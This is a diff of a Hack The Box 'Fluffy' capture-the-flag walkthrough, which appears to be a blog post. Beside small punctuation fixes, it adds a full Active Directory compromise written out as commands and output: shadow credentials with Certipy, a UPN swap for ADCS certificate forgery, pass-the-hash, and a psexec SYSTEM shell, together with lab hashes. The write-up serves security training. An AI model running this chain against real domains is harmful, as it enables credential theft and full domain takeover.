@@ -56,7 +56,7 @@ PORT      STATE SERVICE
 ```
 
 <p class="indent-paragraph">
-The SMB share enumeration on the DC01 host revealed the default administrative shares <code>ADMIN$</code> and <code>C$</code>, the <code>IPC$</code> share for remote IPC access, as well as <code>NETLOGON</code> and <code>SYSVOL</code> for domain logon and policy distribution. Of particular interest was the <code>IT</code> share, which was granted both read and write permissions—offering a potential avenue to upload or exfiltrate sensitive files from the domain controller.
+The SMB share enumeration on the DC01 host revealed the default administrative shares <code>ADMIN$</code> and <code>C$</code><span class="codefix">,</span> the <code>IPC$</code> share for remote IPC access, as well as <code>NETLOGON</code> and <code>SYSVOL</code> for domain logon and policy distribution. Of particular interest was the <code>IT</code> share, which was granted both read and write permissions—offering a potential avenue to upload or exfiltrate sensitive files from the domain controller.
 </p>
 
 ```
@@ -87,7 +87,7 @@ Since we now know the domain is <span class="blue">FLUFFY.HTB</span> and the hos
 ### 🪪 SMB Enumeration
 
 <p class="indent-paragraph">
-Here we authenticate to the “IT” share on the domain controller using <code>smbclient</code> and the credentials we discovered. After connecting, we run <code>dir</code> to enumerate the contents and spot two interesting archives and an <code>Upgrade_Notice.pdf</code>. By issuing <code>get Upgrade_Notice.pdf</code>, we download the file to our local machine for further analysis. 
+Here we authenticate to the “IT” share on the domain controller using <code>smbclient</code> and the credentials we discovered. After connecting, we run <code>dir</code> to enumerate the contents and spot two interesting archives and an <code>Upgrade_Notice.pdf</code><span class="codefix">.</span> By issuing <code>get Upgrade_Notice.pdf</code><span class="codefix">,</span> we download the file to our local machine for further analysis. 
 </p>
 
 ```
@@ -128,7 +128,7 @@ Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21
 ### 💥 CVE-2025-24071 Exploitation
 
 <p class="indent-paragraph">
-To exploit <code>CVE-2025-24071</code>, you can use the public PoC at 
+To exploit <code>CVE-2025-24071</code><span class="codefix">,</span> you can use the public PoC at 
 <a href="https://github.com/ThemeHackers/CVE-2025-24071" target="_blank">ThemeHackers/CVE-2025-24071</a>. It abuses Windows Explorer’s automatic parsing of <code>.library-ms</code> files by packing a malicious SMB path inside a RAR/ZIP. When the archive is extracted, Explorer sends an NTLM authentication request to the attacker-controlled server, leaking the user’s hash.
 </p>
 
@@ -153,7 +153,7 @@ Resolving deltas: 100% (1/1), done.
 ```
 
 <p class="indent-paragraph">
-  Once executed, the exploit creates the <code>.library-ms</code> payload, bundles it into <code>exploit.zip</code>, and cleans up any temporary files. You then host <code>exploit.zip</code> over SMB (or another delivery method) and wait for the victim to extract it—this triggers an automatic SMB authentication to your listener, capturing the NTLM hash for subsequent Pass-the-Hash or relay attacks.
+  Once executed, the exploit creates the <code>.library-ms</code> payload, bundles it into <code>exploit.zip</code><span class="codefix">,</span> and cleans up any temporary files. You then host <code>exploit.zip</code> over SMB (or another delivery method) and wait for the victim to extract it—this triggers an automatic SMB authentication to your listener, capturing the NTLM hash for subsequent Pass-the-Hash or relay attacks.
 </p>
 
 ```
@@ -211,7 +211,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 ### 🔓 Hash Analysis & Cracking
 
 <p class="indent-paragraph">
-To confirm the exact format of the captured credential blob, we ran it through <code>hashid</code>. The analysis clearly identifies it as <strong>NetNTLMv2</strong>, meaning we’re dealing with a modern NT LMv2 challenge–response hash. This tells us how to configure our cracking tools and ensures we select the correct attack mode for maximum efficiency.
+To confirm the exact format of the captured credential blob, we ran it through <code>hashid</code><span class="codefix">.</span> The analysis clearly identifies it as <strong>NetNTLMv2</strong>, meaning we’re dealing with a modern NT LMv2 challenge–response hash. This tells us how to configure our cracking tools and ensures we select the correct attack mode for maximum efficiency.
 </p>
 
 ```
@@ -311,11 +311,356 @@ INFO: Done in 00M 26S
 ```
 
 <p class="indent-paragraph">
-To assess the current privileges and potential escalation paths for our session, we analyzed the imported data in <code>BloodHound</code>. Using a general relationship query<code> MATCH (n)-[r]->(m) RETURN n, r, m</code><span class="codefix">,</span> we visualized a clear graph centered around <code>p.agila@FLUFFY.HTB</code>. The user holds multiple powerful edges, including <code>GenericAll</code> and <code>AddKeyCredentialLink</code> over several objects, suggesting direct abuse potential. Additionally, their membership in the <span class="blue">Service Account Managers</span> group, alongside nested privilege chains through <code>SERVICE ACCOUNTS@FLUFFY.HTB</code>, provides expanded influence over remote access and group policy-linked systems. This graph highlights promising attack paths involving <code>GenericWrite</code>, <code>CanPSRemote</code>, and even <code>GetChangesAll</code> over the domain object itself.
+To assess privilege escalation opportunities from the current user context, we loaded the collected data into <code>BloodHound</code> and initiated graph exploration from <code>p.agila@fluffy.htb</code><span class="codefix">.</span> The resulting visualization revealed that this user possesses direct and transitive privileges over several groups and service accounts — including <code>GenericAll</code><span class="codefix">,</span> <code>GenericWrite</code><span class="codefix">,</span> and <code>AddKeyCredentialLink</code> — which offer viable avenues for lateral movement and privilege escalation<span class="codefix">.</span> The following Cypher query was used to enumerate all reachable relationships: <code> MATCH p=(n:User {name: "P.AGILA@FLUFFY.HTB"})-[r*1..]->(m) RETURN p</code><span class="codefix">.</span>
 </p>
 
 <p class="indent-paragraph">
-  <img src="/img/redteam/htb/fluffy/graph_pagila_fluffy_htb.png" alt="BloodHound graph for levi.james" style="width:100%; border-radius:6px; margin-top: 1em;" />
+  <img src="/img/redteam/htb/fluffy/graph_1_pagila_fluffy_htb.png" alt="BloodHound graph" style="width:100%; border-radius:6px; margin-top: 1em;" />
 </p>
+
+### 🔐 Shadow Credentials Injection
+
+<p class="indent-paragraph">
+During graph exploration from the context of <code>p.agila@fluffy.htb</code><span class="codefix">,</span> we identified that the user had transitive visibility into several service accounts and privileged groups. One notable finding was the account <code>WINRM_SVC@FLUFFY.HTB</code> being a direct member of the <span class="blue">Remote Management Users</span> group. This group grants access to WinRM (via <code>WSMan</code>), making its members suitable candidates for remote command execution through tools like <code>Evil-WinRM</code>. This discovery provided a viable path to achieve remote access by targeting accounts with legitimate permissions, reducing detection risk while maintaining operational integrity.
+</p>
+
+<p class="indent-paragraph">
+  <img src="/img/redteam/htb/fluffy/graph_remote_management_users.png" alt="Remote Management Users group" style="width:100%; border-radius:6px; margin-top: 1em;" />
+</p>
+
+<p class="indent-paragraph">
+Following our initial enumeration in <code>BloodHound</code><span class="codefix">,</span> we identified a promising privilege escalation path starting from <code>p.agila@fluffy.htb</code><span class="codefix">.</span> The user is a member of the <span class="blue">Service Account Managers</span> group, which holds <code>GenericAll</code> rights over the <span class="blue">Service Accounts</span> group. This group in turn has <code>GenericWrite</code> permissions over several service accounts — most notably <code>WINRM_SVC@fluffy.htb</code><span class="codefix">.</span> This permission chain opened a reliable path to gain control over a user with remote execution capabilities. The relationship graph was retrieved using the following Cypher query: <code> MATCH p=(u:User {name: "P.AGILA@FLUFFY.HTB"})-[*1..]->(t:User {name: "WINRM_SVC@FLUFFY.HTB"}) RETURN p</code><span class="codefix">.</span>
+</p>
+
+<p class="indent-paragraph">
+  <img src="/img/redteam/htb/fluffy/graph_2_pagila_fluffy_htb.png" alt="BloodHound graph - WINRM path" style="width:100%; border-radius:6px; margin-top: 1em;" />
+</p>
+
+<p class="indent-paragraph">
+By leveraging the <code>GenericWrite</code> privilege over <code>WINRM_SVC</code><span class="codefix">,</span> we were able to manipulate the account and proceed with a <strong>Shadow Credentials</strong> attack using <code>Certipy</code><span class="codefix">.</span> This technique injected a malicious <code>KeyCredential</code> into the account, authenticated via certificate-based login, and provided full access to the target context. As <code>WINRM_SVC</code> is a member of the <span class="blue">Remote Management Users</span> group, we seamlessly pivoted to remote shell access using <code>Evil-WinRM</code><span class="codefix">,</span> consolidating control without triggering unnecessary alarms.
+</p>
+
+```
+~$ bloodyAD --host dc.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
+
+[+] p.agila added to Service Accounts
+```
+
+<p class="indent-paragraph">
+  <span class="red">Note:</span> Kerberos-based authentication mechanisms are sensitive to time discrepancies between the client and the domain controller. If the local system clock is skewed, operations like ticket requests or certificate-based logins may fail with errors such as <code>KRB_AP_ERR_SKEW</code>. Since tools like <code>ntpdate</code> rely on UDP, the domain controller must be reachable — either directly or via a pivot tunnel (e.g., Ligolo) — for synchronization. To avoid such issues, we used a Bash script that queries the current time from the DC and updates the attacker's local system clock in UTC. This step is essential to ensure reliable Kerberos interactions during shadow credential injection and certificate abuse.
+</p>
+
+```
+~$ cat sync_time_from_dc.sh
+
+#!/bin/bash
+
+# Prompt for the IP address of the Domain Controller
+read -p "[?] Enter the IP address of the Domain Controller: " DC_IP
+
+# Validate input
+if [[ -z "$DC_IP" ]]; then
+  echo "[-] No IP address provided. Exiting."
+  exit 1
+fi
+
+echo "[*] Synchronizing local time with Domain Controller ($DC_IP)..."
+
+# Execute ntpdate with root privileges to sync clock
+if sudo ntpdate "$DC_IP"; then
+  echo "[+] Local system time successfully synchronized with DC ($DC_IP)."
+else
+  echo "[-] Failed to synchronize time. Check connectivity or sudo permissions."
+  exit 1
+fi
+
+~$ ./sync_time_from_dc.sh   
+          
+[?] Enter the IP address of the Domain Controller: <IP>
+[*] Synchronizing local time with Domain Controller (<IP>)...
+2025-05-11 01:54:18.196683 (-0300) +10823.540112 +/- 0.061235 <IP> s1 no-leap
+CLOCK: time stepped by 10823.540112
+[+] Local system time successfully synchronized with DC (<IP>).
+```
+
+<p class="indent-paragraph">
+With inherited <code>GenericWrite</code> permissions over the <code>WINRM_SVC</code> account — as identified via BloodHound — we executed a <strong>Shadow Credentials</strong> attack using <code>Certipy</code><span class="codefix">.</span> After synchronizing the local time to match the domain controller and prevent Kerberos anomalies, we ran the <code>shadow auto</code> module against the target. This procedure generated a new certificate, injected a forged <code>msDS-KeyCredentialLink</code> entry into <code>WINRM_SVC</code><span class="codefix">,</span> and authenticated as the user using certificate-based login. The resulting Kerberos TGT was stored in a credential cache, allowing us to seamlessly extract the account’s <code>NT hash</code> while maintaining operational stealth — as <code>Certipy</code> automatically restored the original credentials post-exploitation.
+</p>
+
+```
+~$ certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account winrm_svc
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'd46d80c7-67d9-fd2b-574e-6a39e8d88bd1'
+[*] Adding Key Credential with device ID 'd46d80c7-67d9-fd2b-574e-6a39e8d88bd1' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID 'd46d80c7-67d9-fd2b-574e-6a39e8d88bd1' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+~$ [*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+```
+
+<p class="indent-paragraph">
+To validate the integrity of the retrieved credentials, we authenticated against the domain controller <code>dc.fluffy.htb</code> using the <code>NT hash</code> via the <code>SMB</code> protocol. The tool <code>nxc</code> confirmed successful authentication as <code>WINRM_SVC</code><span class="codefix">,</span> verifying the effectiveness of the attack chain and setting the stage for remote execution using <code>Evil-WinRM</code> or similar tools.
+</p>
+
+```
+~$ nxc smb dc.fluffy.htb -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'         
+
+SMB         <IP>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
+SMB         <IP>     445    DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767
+```
+
+<p class="indent-paragraph">
+With confirmed membership of <code>WINRM_SVC</code> in the <span class="blue">Remote Management Users</span> group — as identified through <code>BloodHound</code> — we leveraged Evil-WinRM to establish a remote PowerShell session using the recovered <code>NT hash</code><span class="codefix">.</span> Since this group grants permission to interact with the host via the <code>WSMan</code> protocol, no administrative rights were necessary to obtain interactive access. This allowed us to pivot seamlessly into the target system while maintaining a low operational footprint. Once connected, we navigated to the user's desktop and successfully captured the first flag <code>user.txt</code><span class="codefix">,</span> confirming code execution within the compromised context.
+</p>
+
+```
+~$ evil-winrm -i dc.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir
+
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/15/2025   4:02 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
+*********************************
+```
+
+### ⬆️ Privilege Escalation
+
+<p class="indent-paragraph">
+Following the initial foothold, we shifted focus toward identifying accounts with elevated interactions within the certificate infrastructure. While operating as <code>WINRM_SVC</code> in the context of <code>Evil-WinRM</code><span class="codefix">,</span> we executed an enumeration of the <span class="blue">Cert Publishers</span> group using PowerShell. This group plays a critical role in certificate operations and often includes accounts trusted by the Certificate Authority. The enumeration revealed two principals: the domain controller's machine account <code>DC01$</code> and the user account <code>ca_svc</code><span class="codefix">.</span> This discovery isolated <code>ca_svc</code> as the only user-level identity with potential influence over certificate publication workflows, marking it as a prime target for privilege escalation through certificate-based attacks.
+</p>
+
+```
+~$ *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> Get-ADGroupMember -Identity "CERT PUBLISHERS"
+
+
+distinguishedName : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+name              : certificate authority service
+objectClass       : user
+objectGUID        : dd971404-b662-443d-95db-1325e21fa032
+SamAccountName    : ca_svc
+SID               : S-1-5-21-497550768-2797716248-2627064577-1103
+
+distinguishedName : CN=DC01,OU=Domain Controllers,DC=fluffy,DC=htb
+name              : DC01
+objectClass       : computer
+objectGUID        : 188e7274-9c9b-45fb-b488-e6db23d6337f
+SamAccountName    : DC01$
+SID               : S-1-5-21-497550768-2797716248-2627064577-1000
+```
+
+<p class="indent-paragraph">
+To further confirm the group membership, we parsed each member of the <span class="blue">Cert Publishers</span> group via LDAP resolution using PowerShell's ADSI interface. This yielded only two <code>sAMAccountName</code> entries: <code>ca_svc</code> and <code>DC01$</code><span class="codefix">.</span> This reinforced our previous finding — <code>ca_svc</code> is the only human-controlled account trusted by the certificate services, thus uniquely positioned for abuse in enrollment scenarios targeting the <code>User</code> template.
+</p>
+
+```
+~$ *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> $group.Member | ForEach-Object { ([ADSI]("LDAP://$_")).sAMAccountName }
+
+ca_svc
+DC01$
+```
+
+<p class="indent-paragraph">
+To visualize this relationship graphically, we executed a Cypher query within <code>BloodHound</code> to identify all users belonging to the <span class="blue">Cert Publishers</span> group. The result returned only the <code>CA_SVC@FLUFFY.HTB</code> node, reinforcing our earlier PowerShell findings.
+</p>
+
+<p class="indent-paragraph">
+  <img src="/img/redteam/htb/fluffy/graph_cert_publishers_fluffy_htb.png" alt="Cert Publishers" style="width:100%; border-radius:6px; margin-top: 1em;" />
+</p>
+
+<p class="indent-paragraph">
+To escalate privileges without triggering alarms, we executed a <strong>Shadow Credentials</strong> attack against the <code>CA_SVC</code> account using the already-privileged user <code>p.agila</code><span class="codefix">.</span> By invoking the <code>shadow auto</code> module from <code>Certipy</code><span class="codefix">,</span> we injected a forged <code>KeyCredential</code> into the target account and authenticated via certificate to obtain a valid Kerberos TGT<span class="codefix">.</span> The operation concluded successfully with the generation of a <code>ca_svc.ccache</code> file and extraction of the <code>NT hash</code><span class="codefix">,</span> enabling full impersonation of the certificate authority service without password reuse or service disruption.
+</p>
+
+```
+~$ certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account ca_svc
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '51389abb-1f80-b76c-f60a-a8ada11e3fd5'
+[*] Adding Key Credential with device ID '51389abb-1f80-b76c-f60a-a8ada11e3fd5' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '51389abb-1f80-b76c-f60a-a8ada11e3fd5' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+```
+
+
+<p class="indent-paragraph">
+With a valid <code>ccache</code> file obtained for the <code>CA_SVC</code> account — a privileged user identified as a member of the <span class="blue">Cert Publishers</span> group — we prepared the environment to execute Kerberos-authenticated operations without the need to reuse passwords or NT hashes<span class="codefix">.</span> By exporting the <code>KRB5CCNAME</code> environment variable to point to the <code>ca_svc.ccache</code> file, we enabled Kerberos-aware tools such as <code>impacket</code> to seamlessly use the embedded TGT for authentication<span class="codefix">.</span> This configuration establishes a stealthy and passwordless foothold for subsequent privilege escalation steps through legitimate Kerberos channels.
+</p>
+
+```
+~$ export KRB5CCNAME=ca_svc.ccache
+
+```
+
+<p class="indent-paragraph">
+To extract key attributes and verify the configuration of the <code>ca_svc</code> account — a privileged identity tied to certificate services — we employed the <code>account</code> module of <code>Certipy</code>, authenticated via NT hash<span class="codefix">.</span> This enumeration revealed metadata such as the <code>servicePrincipalName</code>, <code>userPrincipalName</code>, and <code>distinguishedName</code><span class="codefix">,</span> confirming the account’s association with the Active Directory Certificate Services (ADCS) infrastructure<span class="codefix">.</span> The presence of an SPN (<code>ADCS/ca.fluffy.htb</code>) further validates its role as a service account, which can be leveraged for Kerberos-based operations such as S4U abuse or certificate-based privilege escalation<span class="codefix">.</span>
+</p>
+
+```
+~$ certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip <IP> -user 'ca_svc' read
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+    userPrincipalName                   : ca_svc@fluffy.htb
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-04-17T16:07:50+00:00
+    whenChanged                         : 2025-07-15T13:52:25+00:00
+```
+
+<p class="indent-paragraph">
+To escalate privileges without triggering typical alerts or relying on credential reuse, we used <code>Certipy</code> to modify the <code>userPrincipalName</code> (UPN) attribute of <code>CA_SVC</code> — a user with certificate enrollment rights. By setting the UPN to <code>administrator@fluffy.htb</code><span class="codefix">,</span> we effectively crafted a forged identity tied to an administrative principal. This manipulation allows the issued certificate to impersonate the domain administrator during certificate-based authentication, creating a seamless and covert escalation path.
+</p>
+
+```
+~$ certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip <IP> -upn 'administrator@fluffy.htb' -user 'ca_svc' update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator@fluffy.htb
+[*] Successfully updated 'ca_svc'
+```
+
+<p class="indent-paragraph">
+With the <code>userPrincipalName</code> of <code>CA_SVC</code> set to <code>administrator@fluffy.htb</code><span class="codefix">,</span> we proceeded to request a certificate impersonating the domain administrator. Using <code>Certipy</code> with the <code>User</code> template and authenticated via NT hash, the tool successfully issued a certificate with the forged UPN. The generated certificate was saved locally as <code>administrator.pfx</code><span class="codefix">.</span> Although the certificate lacks a valid object SID — which can limit certain attacks — it remains fully capable of authenticating as <code>administrator</code> for Kerberos-based interactions, enabling a stealthy privilege escalation without relying on password cracking or hash injection.
+</p>
+
+```
+~$ certipy-ad req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip <IP> -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 18
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@fluffy.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+<p class="indent-paragraph">
+After successfully obtaining a forged certificate for <code>administrator@fluffy.htb</code><span class="codefix">,</span> we restored the original <code>userPrincipalName</code> of the <code>CA_SVC</code> account to <code>ca_svc@fluffy.htb</code> to maintain operational stealth and integrity within the domain environment<span class="codefix">.</span> This cleanup step ensures that no visible artifacts or identity inconsistencies remain on the compromised service account, preserving its appearance and functionality for future access if needed.
+</p>
+
+```
+~$ certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip <IP> -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+```
+
+<p class="indent-paragraph">
+With the forged certificate tied to the impersonated <code>administrator@fluffy.htb</code> identity, we authenticated to the domain using <code>Certipy's auth</code> module in certificate mode<span class="codefix">.</span> This process established a Kerberos session for the domain administrator without requiring credentials or NT hashes, leveraging the generated <code>administrator.pfx</code> file<span class="codefix">.</span> Upon successful authentication, the tool issued a valid TGT and retrieved the <code>NT hash</code> of the <code>Administrator</code> account, thereby granting us full control over the domain<span class="codefix">.</span> The extracted hash was later used for post-exploitation actions such as lateral movement and interactive sessions.
+</p>
+
+```
+~$ certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip <IP>
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@fluffy.htb'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+```
+
+<p class="indent-paragraph">
+To confirm the successful privilege escalation, we authenticated to the domain controller over SMB using the recovered <code>NT hash</code> of the <code>Administrator</code> account<span class="codefix">.</span> The <code>nxc</code> tool validated the credentials and reported <strong>(Pwn3d!)</strong><span class="codefix">,</span> indicating full administrative access to the system<span class="codefix">.</span> This final step confirmed that the previously issued certificate allowed for complete domain compromise without any user interaction or password reuse, demonstrating a stealthy and highly effective escalation path via Active Directory Certificate Services (ADCS).
+</p>
+
+```
+~$ nxc smb dc.fluffy.htb -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
+SMB         <IP>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
+SMB         <IP>     445    DC01             [+] fluffy.htb\administrator:8da83a3fa618b6e3a00e93f676c92a6e (Pwn3d!)
+```
+
+<p class="indent-paragraph">
+With the NT hash of <code>Administrator</code> extracted and validated, we concluded the privilege escalation chain by executing <code>psexec</code> over SMB using Impacket’s toolkit. By supplying the recovered hash and targeting the domain controller <code>dc.fluffy.htb</code>, we were able to spawn a fully interactive SYSTEM shell under the context of the domain administrator. This method allowed us to bypass interactive login restrictions and directly execute commands on the host. Once inside the session, we navigated to the Administrator's desktop and successfully retrieved the final flag <code>root.txt</code><span class="codefix">,</span> confirming complete compromise of the target domain controller.
+</p>
+
+```
+~$ impacket-psexec -hashes :8da83a3fa618b6e3a00e93f676c92a6e FLUFFY.HTB/Administrator@dc.fluffy.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc.fluffy.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file voYgJOsM.exe
+[*] Opening SVCManager on dc.fluffy.htb.....
+[*] Creating service hPKF on dc.fluffy.htb.....
+[*] Starting service hPKF.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.6893]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3DE7-5FBC
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/19/2025  03:31 PM    <DIR>          .
+05/19/2025  03:31 PM    <DIR>          ..
+07/15/2025  04:02 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   9,219,903,488 bytes free
+
+C:\Users\Administrator\Desktop> type root.txt
+******************************
+```
+
 
 
